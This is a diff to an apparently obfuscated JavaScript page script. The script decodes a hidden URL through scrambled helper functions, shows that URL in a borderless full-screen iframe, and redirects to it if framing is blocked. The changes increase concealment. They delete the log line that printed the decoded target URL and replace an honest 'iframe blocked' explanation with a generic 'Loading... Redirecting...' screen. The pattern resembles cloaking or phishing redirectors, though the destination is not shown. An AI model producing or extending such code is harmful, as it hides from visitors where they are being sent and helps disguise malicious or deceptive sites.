@@ -57,46 +57,64 @@
                 
                 // Get decoded URL
                 var targetUrl = _0x5e6f(_0x3c4d());
-                console.log('Target URL decoded:', targetUrl);
                 
                 // Create and load iframe
-                if (targetUrl && document.body) {
-                    var frame = document.createElement('iframe');
-                    frame.id = 'contentFrame';
-                    frame.src = targetUrl;
-                    frame.setAttribute('frameborder', '0');
-                    frame.setAttribute('allowfullscreen', '');
-                    frame.setAttribute('allow', 'autoplay; encrypted-media; fullscreen');
-                    frame.style.width = '100%';
-                    frame.style.height = '100vh';
-                    frame.style.border = 'none';
-                    frame.style.display = 'block';
-                    
-                    // Add error handling for iframe load issues
-                    frame.onerror = function() {
-                        console.error('Iframe failed to load');
-                        document.body.innerHTML = '<p style="padding: 20px; font-family: Arial;">Iframe blocked. The target site may have X-Frame-Options or CSP headers preventing embedding. Redirecting...</p>';
-                        setTimeout(function() {
-                            window.location.href = targetUrl;
-                        }, 2000);
-                    };
-                    
-                    frame.onload = function() {
-                        console.log('Iframe loaded successfully');
-                    };
-                    
-                    document.body.appendChild(frame);
-                    
-                    // Fallback: if iframe doesn't load within 5 seconds, redirect
+                if (!targetUrl || !document.body) {
+                    console.error('Failed to initialize');
+                    return;
+                }
+                
+                var frame = document.createElement('iframe');
+                frame.id = 'contentFrame';
+                frame.src = targetUrl;
+                frame.setAttribute('frameborder', '0');
+                frame.setAttribute('allowfullscreen', '');
+                frame.setAttribute('allow', 'autoplay; encrypted-media; fullscreen');
+                frame.style.width = '100%';
+                frame.style.height = '100vh';
+                frame.style.border = 'none';
+                frame.style.display = 'block';
+                
+                // Add error handling for iframe load issues
+                frame.onerror = function() {
+                    console.error('Iframe failed to load');
+                    document.body.innerHTML = '<div style="padding: 20px; font-family: Arial; text-align: center;"><h2>Loading...</h2><p>Redirecting...</p></div>';
                     setTimeout(function() {
-                        if (frame.contentWindow === null || frame.contentDocument === null) {
+                        window.location.href = targetUrl;
+                    }, 2000);
+                };
+                
+                frame.onload = function() {
+                    console.log('Iframe loaded successfully');
+                };
+                
+                document.body.appendChild(frame);
+                
+                // Fallback: if iframe doesn't load within 5 seconds, redirect
+                setTimeout(function() {
+                    try {
+                        var isBlocked = false;
+                        try {
+                            var test = frame.contentWindow;
+                            if (test === null) {
+                                isBlocked = true;
+                            }
+                        } catch(e) {
+                            // Cross-origin error is normal, but check if iframe has any content
+                            var rect = frame.getBoundingClientRect();
+                            if (rect.height === 0 && rect.width === 0) {
+                                isBlocked = true;
+                            }
+                        }
+                        
+                        if (isBlocked) {
                             console.warn('Iframe blocked - redirecting as fallback');
                             window.location.href = targetUrl;
                         }
-                    }, 5000);
-                } else {
-                    console.error('Failed to decode URL or body not ready');
-                }
+                    } catch(e) {
+                        console.error('Error checking iframe status:', e);
+                    }
+                }, 5000);
             }
             
             // Run when DOM is ready
